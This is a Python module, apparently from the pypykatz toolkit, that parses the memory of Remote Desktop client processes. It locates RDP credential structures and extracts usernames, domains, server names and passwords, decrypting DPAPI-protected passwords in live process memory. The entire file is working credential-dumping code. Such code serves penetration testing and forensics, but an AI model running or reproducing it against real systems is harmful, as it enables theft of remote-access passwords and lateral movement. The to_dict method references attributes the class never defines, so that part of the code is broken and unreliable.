import json
import hashlib
import math

from pypykatz import logger
from pypykatz.commons.common import hexdump
from pypykatz.commons.common import KatzSystemArchitecture, WindowsBuild, WindowsMinBuild


class RDPCredential:
    def __init__(self):
        self.credtype = 'rdp'
        self.domainname = None
        self.username = ''
        self.password = ''
        self.password_raw = b''
        self.isencrypted = None 
        self.servername = ''
        self.serverfqdn = ''

    def to_dict(self):
        t = {}
        t['credtype'] = self.credtype
        t['domainname'] = self.cachedir
        t['username'] = self.PRT
        t['password'] = self.key_guid
        t['password_raw'] = self.dpapi_key
        return t
        
    def to_json(self):
        return json.dumps(self.to_dict())
        
    def __str__(self):
        t = '\t== RDP Credential ==\n'
        t += '\t\tdomainname %s\n' % self.domainname
        t += '\t\tusername %s\n' % self.username
        t += '\t\tpassword \'%s\'\n' % self.password

        try:
            t += '\t\tpassword_raw %s\n' % self.password_raw.hex()
        except:
            t += '\t\tpassword_raw %s\n' % self.password_raw

        t += '\t\tisencrypted: %s\n' % str(self.isencrypted)
        t += '\t\tservername: \'%s\'\n' % self.servername
        t += '\t\tserverfqdn: \'%s\'\n' % self.serverfqdn
        return t

class RDPCredentialDecryptorMstsc:
    def __init__(self, process, reader, decryptor_template, sysinfo, find_first=False):
        self.process = process
        self.reader = reader
        self.sysinfo = sysinfo
        self.decryptor_template = decryptor_template
        self.credentials = []
        self.find_first = find_first

    def find_string(self, chunck):
        marker = chunck.find(b'\x00\x00')
        if marker <= 0:
            chunck = b''
        return chunck[:marker + 1]

    def find_entries(self, chunksize=10*1024):
        reader = self.reader.get_reader()
        handler = reader.get_handler() 
        memory_segments = reader.get_memory() 

        #x = self.reader.find_all_global(self.decryptor_template.signature)
        for ms in memory_segments:
            x = ms.search(self.decryptor_template.signature, handler)

            for addr in x:
                self.reader.move(addr)
                properties = self.decryptor_template.properties_struct(self.reader)
                if properties.unkh0 == int(0xdbcaabcd):
                    if properties.unkd1 >= 10 and properties.unkd1 < 500:
                        if properties.cbProperties >= 10 and properties.cbProperties < 500:
                            if properties.pProperties.value:
                                """
                                logger.debug("========TS_PROPERTIES_KIWI=========")
                                logger.debug("unkh0 = {}".format(hex(properties.unkh0)))
                                logger.debug("unkd0 = {}".format(hex(properties.unkd0)))
                                logger.debug("unkp2 = {}".format(hex(properties.unkp2)))
                                logger.debug("unkd1 = {}".format(properties.unkd1))
                                logger.debug("unkp3 = {}".format(hex(properties.unkp3)))
                                logger.debug("pProperties = {}".format(hex(properties.pProperties.value)))
                                logger.debug("cbProperties = {}".format(properties.cbProperties))
                                logger.debug("===================================")
                                """
                                try:
                                    self.reader.move(properties.pProperties.value)
                                    cred = RDPCredential()
                    
                                    for i in range(properties.cbProperties):
                                        property = self.decryptor_template.property_struct(self.reader)
                               
                                        if property.szProperty and property.dwType > 0 and property.dwType < 20:
                                            """
                                            logger.debug("========TS_PROPERTY_KIWI=========")
                                            logger.debug("szProperty = {}".format(hex(property.szProperty)))
                                            logger.debug("dwType = {}".format(property.dwType))
                                            logger.debug("pvData = {}".format(hex(property.pvData)))
                                            logger.debug("unkp0 = {}".format(property.unkp0))
                                            logger.debug("unkd0 = {}".format(property.unkd0))
                                            logger.debug("dwFlags = {}".format(property.dwFlags))
                                            logger.debug("unkd1 = {}".format(property.unkd1))
                                            logger.debug("unkd2 = {}".format(property.unkd2))
                                            logger.debug("pValidator = {}".format(hex(property.pValidator)))
                                            logger.debug("unkp2 = {}".format(property.unkp2))
                                            logger.debug("unkp3 = {}".format(property.unkp3))
                                            logger.debug("=================================")
                                            """
                                            current_addr = self.reader.tell()
                                            try:
                                                self.reader.move(property.szProperty)
                                                chunck = self.reader.read(1024)
                                                string = self.find_string(chunck)
                                                marker = string.find(b'\x00')
                                                if marker > 0:
                                                    string = string[:marker]
                                                szProperty = string.decode('utf-8')

                                                szProperties = ["ServerName", "ServerFqdn", "ServerNameUsedForAuthentication", "UserSpecifiedServerName", "UserName", "Domain", "Password", "SmartCardReaderName", "RDmiUsername", "PasswordContainsSCardPin"]
                                                if szProperty in szProperties:
                                                    value = ''
                                                    if property.dwType == 3:
                                                        value = "TRUE" if property.pvData else "FALSE"
                                                        #print("{:<35s}\t[bool] {}".format(szProperty, "TRUE" if property.pvData else "FALSE"))

                                                    if property.dwType == 4:
                                                        self.reader.move(property.pvData)
                                                        chunck = self.reader.read(1024)
                                                        string = self.find_string(chunck)
                                                        value = string.decode('utf-16-le')
                                                        #print("{:<35s}\t[wstring] '{}'".format(szProperty, string.decode('utf-16-le')))
                                                        
                                                    elif property.dwType == 6:  
                                                        if property.pvData and property.unkp2:
                                                            self.reader.move(property.pvData)
                                                            chunck = self.reader.read(property.unkp2)
                                                            if property.dwFlags & 0x800:
                                                                #print("{:<35s}\t[protect] {} (length = {})".format(szProperty, chunck, property.unkp2))
                                                                if self.process is None:
                                                                    value = chunck
                                                                else:
                                                                    value = self.process.dpapi_memory_unprotect(property.pvData, property.unkp2, 0)
                                                                    if len(value) > 4:
                                                                        value = value[4:]
                                                            else:
                                                                #print("{:<35s}\t[unprotect] {} (length = {})".format(szProperty, chunck, property.unkp2))
                                                                value = chunck

                                                    if value is None:
                                                        value = b''
                                                    if szProperty == "ServerName":
                                                        cred.servername = value
                                                    elif szProperty == "ServerFqdn":
                                                        cred.serverfqdn = value
                                                    elif szProperty == "UserName":
                                                        cred.username = value
                                                    elif szProperty == "Domain":
                                                        cred.domainname = value
                                                    elif szProperty == "Password" and (property.dwFlags & 0x800):
                                                        cred.password_raw = value
                                                        if self.process is None:
                                                            cred.password = ''
                                                            cred.isencrypted = True
                                                        else:
                                                            cred.password = cred.password_raw.decode('utf-16-le').rstrip('\x00')
                                                            cred.isencrypted = False
                                                    elif szProperty == "Password":
                                                        cred.password_raw = value
                                                        cred.password = value.decode('utf-16-le')
                                                        cred.isencrypted = False

                                            except Exception as e: # Memory address not in process memory space
                                                logger.debug("Error: {}".format(e))
                                            self.reader.move(current_addr)
                                    
                                    if cred.username:
                                        self.credentials.append(cred)    
                                        if self.find_first:
                                            return

                                except Exception as e: # Memory address not in process memory space
                                    logger.debug("Error: {}".format(e))


    def start(self, chunksize=10*1024):
        #x = self.reader.find_all_global(self.decryptor_template.signature)
        self.find_entries(chunksize)
        if not len(self.credentials):
            logger.debug('No RDP credentials found!')


class RDPCredentialDecryptorLogonpasswords:
    def __init__(self, process, reader, decryptor_template, sysinfo, find_first=False, lower_bound=0, upper_bound=-1):
        self.process = process
        self.reader = reader
        self.sysinfo = sysinfo
        self.decryptor_template = decryptor_template
        self.credentials = []
        self.find_first = find_first
        self.lower_bound = lower_bound
        self.upper_bound = upper_bound

    def add_entry(self, rdpcred_entry):
        if hex(rdpcred_entry.unk1.value & 0xff010000) == hex(0x00010000): # mstscax & freerdp
            bIsCandidate = True
        elif not hex(rdpcred_entry.unk1.value & 0xffff0000): # rdesktop
            bIsCandidate = True
        else:
            bIsCandidate = False

        try:
            if bIsCandidate and rdpcred_entry.cbDomain <= 512 and rdpcred_entry.cbUsername <= 512 and rdpcred_entry.cbUsername > 0 and rdpcred_entry.cbPassword <= 512 and rdpcred_entry.cbPassword > 0:
                domainame = rdpcred_entry.Domain[:rdpcred_entry.cbDomain].decode('utf-16-le')
                username = rdpcred_entry.UserName[:rdpcred_entry.cbUsername].decode('utf-16-le')
                password_raw = rdpcred_entry.Password[:rdpcred_entry.cbPassword]

                if self.sysinfo.buildnumber >= WindowsMinBuild.WIN_10.value:
                    if self.process is None:
                        logger.debug('Credentials found but they are encrypted!')
                        password_raw = rdpcred_entry.Password[:16 * math.ceil(rdpcred_entry.cbPassword/16)]
                        password = ''
                        isencrypted = True
                    else:
                        password_raw = self.process.dpapi_memory_unprotect(rdpcred_entry.Password_addr, rdpcred_entry.cbPassword, 0)
                        password = password_raw.decode('utf-16-le').rstrip('\x00')
                        isencrypted = False
                else:
                    password = password_raw.decode('utf-16-le')
                    password_raw = password_raw.split(b'\x00\x00')[0] + b'\x00'
                    isencrypted = False

                cred = RDPCredential()
                cred.domainname = domainame
                cred.username = username
                cred.password = password
                cred.password_raw = password_raw
                cred.isencrypted = isencrypted
                self.credentials.append(cred)

            else:
                logger.debug('This RDPCred entry is garbage!')
        except Exception as e:
            logger.debug('RDP entry parsing error! Reason %s' % e)
            
    
    def start(self, chunksize=10*1024):
        reader = self.reader.get_reader()
        handler = reader.get_handler() 
        memory_segments = reader.get_memory() 

        if self.upper_bound == -1:
            self.upper_bound = len(memory_segments)

        for idx, ms in enumerate(memory_segments):
            if idx > self.lower_bound and idx < self.upper_bound:
                x = []
                for signature in self.decryptor_template.signatures:
                    x += ms.search(signature, handler)
            
                for addr in x:
                    addr += self.decryptor_template.offset
                    self.reader.move(addr)
                        
                    try:
                        cred = self.decryptor_template.cred_struct(self.reader)
                    except Exception as e:
                        logger.debug('Reading error! (this can be normal here) %s' % str(e))
                        continue

                    self.add_entry(cred)
                    if len(self.credentials) > 0 and self.find_first:
                        return


